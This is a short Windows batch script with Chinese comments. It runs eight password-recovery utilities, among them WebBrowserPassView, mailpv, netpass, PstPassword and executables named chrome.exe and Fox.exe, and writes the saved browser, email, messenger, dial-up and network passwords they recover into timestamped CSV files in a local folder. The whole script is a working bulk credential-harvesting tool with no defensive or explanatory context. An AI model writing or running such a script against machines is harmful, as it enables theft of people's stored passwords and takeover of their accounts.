

REM 生成时间戳
call :getTimestamp timestamp

REM 运行代码并添加时间戳到生成文件名称后面
G:\pc\repo\chrome.exe /scomma "G:\pc\repo\file\ps\chrome_%timestamp%.csv"
G:\pc\repo\Dialupass.exe /scomma "G:\pc\repo\file\ps\Dialupass_%timestamp%.csv"
G:\pc\repo\mailpv.exe /scomma "G:\pc\repo\file\ps\mailpv_%timestamp%.csv"
G:\pc\repo\mspass.exe /scomma "G:\pc\repo\file\ps\mspass_%timestamp%.csv"
G:\pc\repo\netpass.exe /scomma "G:\pc\repo\file\ps\netpass_%timestamp%.csv"
G:\pc\repo\Fox.exe /scomma "G:\pc\repo\file\ps\Fox_%timestamp%.csv"
G:\pc\repo\PstPassword.exe /scomma "G:\pc\repo\file\ps\PstPassword_%timestamp%.csv"
G:\pc\repo\WebBrowserPassView.exe /scomma "G:\pc\repo\file\ps\WebBrowserPassView_%timestamp%.csv"

REM 退出脚本
exit /b

:getTimestamp
REM 获取当前日期和时间，包括秒
for /F "tokens=1-6 delims=/:. " %%a in ("%date% %time%") do (
  set "day=%%a"
  set "month=%%b"
  set "year=%%c"
  set "hour=%%d"
  set "minute=%%e"
  set "second=%%f"
)

REM 格式化日期和时间，并组合成唯一标识
set "timestamp=%year%%month%%day%_%hour%%minute%%second%"

REM 返回时间戳
set "%~1=%timestamp%"
exit /b
